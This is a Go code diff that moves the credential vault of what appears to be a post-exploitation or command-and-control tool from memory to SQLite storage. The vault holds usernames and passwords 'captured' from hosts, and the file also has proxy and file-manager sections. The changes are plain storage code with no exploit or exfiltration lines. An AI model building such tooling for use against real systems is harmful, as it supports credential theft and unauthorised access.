@@ -8,10 +8,10 @@ import (
 	"net"
 	"os"
 	"path/filepath"
-	"strings"
 	"sync"
 	"time"
 
+	"bty/src/go/internal/db"
 	"bty/src/go/internal/socks"
 )
 
@@ -75,82 +75,120 @@ func (m *SOCKS5Manager) ListProxies() map[string]string {
 	return result
 }
 
-// --- Credential Vault ---
-
-// CredentialVault stores captured credentials.
-type CredentialVault struct {
-	creds []Credential
-	mu    sync.RWMutex
-}
+// --- Credential Vault (SQLite-backed) ---
 
 // Credential represents a captured credential.
 type Credential struct {
-	ID        string    `json:"id"`
-	Username  string    `json:"username"`
-	Password  string    `json:"password"`
-	Domain    string    `json:"domain"`
-	Host      string    `json:"host"`
-	Service   string    `json:"service"`
-	Source    string    `json:"source"`
-	Captured  time.Time `json:"captured"`
-	Notes     string    `json:"notes"`
+	ID       string    `json:"id"`
+	Username string    `json:"username"`
+	Password string    `json:"password"`
+	Domain   string    `json:"domain"`
+	Host     string    `json:"host"`
+	Service  string    `json:"service"`
+	Source   string    `json:"source"`
+	Captured time.Time `json:"captured"`
+	Notes    string    `json:"notes"`
 }
 
-// NewCredentialVault creates a new credential vault.
-func NewCredentialVault() *CredentialVault {
-	return &CredentialVault{
-		creds: make([]Credential, 0),
+// CredentialVault stores captured credentials in SQLite.
+type CredentialVault struct {
+	db interface {
+		AddCredential(c *db.CredentialRecord) error
+		ListCredentials() ([]db.CredentialRecord, error)
+		SearchCredentials(query string) ([]db.CredentialRecord, error)
+		DeleteCredential(id string) error
+		CountCredentials() (int, error)
 	}
 }
 
-// Add adds a credential to the vault.
-func (v *CredentialVault) Add(c Credential) string {
-	v.mu.Lock()
-	defer v.mu.Unlock()
+// NewCredentialVault creates a new credential vault backed by SQLite.
+func NewCredentialVault(database interface {
+	AddCredential(c *db.CredentialRecord) error
+	ListCredentials() ([]db.CredentialRecord, error)
+	SearchCredentials(query string) ([]db.CredentialRecord, error)
+	DeleteCredential(id string) error
+	CountCredentials() (int, error)
+}) *CredentialVault {
+	return &CredentialVault{db: database}
+}
 
-	c.ID = fmt.Sprintf("cred-%x", time.Now().UnixNano())
-	c.Captured = time.Now()
-	v.creds = append(v.creds, c)
-	return c.ID
+// Add adds a credential to the vault (persisted to SQLite).
+func (v *CredentialVault) Add(c Credential) string {
+	id := fmt.Sprintf("cred-%x", time.Now().UnixNano())
+	rec := &db.CredentialRecord{
+		ID:       id,
+		Username: c.Username,
+		Password: c.Password,
+		Domain:   c.Domain,
+		Host:     c.Host,
+		Service:  c.Service,
+		Source:   c.Source,
+		Notes:    c.Notes,
+		Captured: time.Now(),
+	}
+	if err := v.db.AddCredential(rec); err != nil {
+		log.Printf("[VAULT] Failed to persist credential: %v", err)
+	}
+	return id
 }
 
 // Search searches credentials by keyword.
 func (v *CredentialVault) Search(query string) []Credential {
-	v.mu.RLock()
-	defer v.mu.RUnlock()
-
-	var results []Credential
-	query = strings.ToLower(query)
-
-	for _, c := range v.creds {
-		if query == "" ||
-			strings.Contains(strings.ToLower(c.Username), query) ||
-			strings.Contains(strings.ToLower(c.Domain), query) ||
-			strings.Contains(strings.ToLower(c.Host), query) ||
-			strings.Contains(strings.ToLower(c.Service), query) ||
-			strings.Contains(strings.ToLower(c.Source), query) {
-			results = append(results, c)
-		}
+	records, err := v.db.SearchCredentials(query)
+	if err != nil {
+		log.Printf("[VAULT] Failed to search credentials: %v", err)
+		return nil
 	}
 
+	var results []Credential
+	for _, r := range records {
+		results = append(results, Credential{
+			ID:       r.ID,
+			Username: r.Username,
+			Password: r.Password,
+			Domain:   r.Domain,
+			Host:     r.Host,
+			Service:  r.Service,
+			Source:   r.Source,
+			Notes:    r.Notes,
+			Captured: r.Captured,
+		})
+	}
 	return results
 }
 
 // List returns all credentials.
 func (v *CredentialVault) List() []Credential {
-	v.mu.RLock()
-	defer v.mu.RUnlock()
+	records, err := v.db.ListCredentials()
+	if err != nil {
+		log.Printf("[VAULT] Failed to list credentials: %v", err)
+		return nil
+	}
 
-	result := make([]Credential, len(v.creds))
-	copy(result, v.creds)
-	return result
+	var results []Credential
+	for _, r := range records {
+		results = append(results, Credential{
+			ID:       r.ID,
+			Username: r.Username,
+			Password: r.Password,
+			Domain:   r.Domain,
+			Host:     r.Host,
+			Service:  r.Service,
+			Source:   r.Source,
+			Notes:    r.Notes,
+			Captured: r.Captured,
+		})
+	}
+	return results
 }
 
 // Count returns the number of stored credentials.
 func (v *CredentialVault) Count() int {
-	v.mu.RLock()
-	defer v.mu.RUnlock()
-	return len(v.creds)
+	count, err := v.db.CountCredentials()
+	if err != nil {
+		return 0
+	}
+	return count
 }
 
 // --- File Manager ---
